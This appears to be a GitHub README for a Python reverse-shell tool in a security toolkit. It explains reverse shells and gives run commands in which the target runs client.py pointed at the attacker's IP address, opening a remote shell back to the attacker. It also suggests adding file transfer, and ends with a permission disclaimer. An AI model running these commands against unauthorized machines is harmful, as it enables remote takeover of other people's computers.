# Reverse Shell for Windows, Linux and Mac OS
The reverse shell's goal is to connect to a remote computer and redirect the input and output connections of the target system’s shell so the attacker can access it remotely. Reverse shells allow attackers to open ports to the target machines, forcing communication and enabling a complete takeover of the target machine. Therefore it is a severe security threat.

&nbsp;
## What is this project about?
Implementing a reverse shell in Python using sockets that can execute remote shell commands and send the results back to the server.

&nbsp;
## How to run this project?
**Step 1:** 
This project requires Python3 to run. You can download it from [HERE](https://www.python.org/downloads/).

**Step 2:**
Clone this repository:
    
    git clone https://github.com/NikunjKunduru/Cyber-Toolkit.git

**Step 3:**
Go to the cloned directory and run the following commands:
    
    cd Cyber-Toolkit/Reverse_Shell
    
    Attacker's shell:
        python3 server.py

    Target's shell:
        python3 client.py <Attacker's IP address>

&nbsp;
## Check-out
Add [download and upload](https://www.thepythoncode.com/article/send-receive-files-using-sockets-python) commands to download and upload files from/to the client. And many more! There are endless possibilities. The only limit here is your imagination!

&nbsp;
## DISCLAIMER 
Note that use this code only on a computer you have permission to. Use it at your own risk!

<br />

🤖**References:** https://www.thepythoncode.com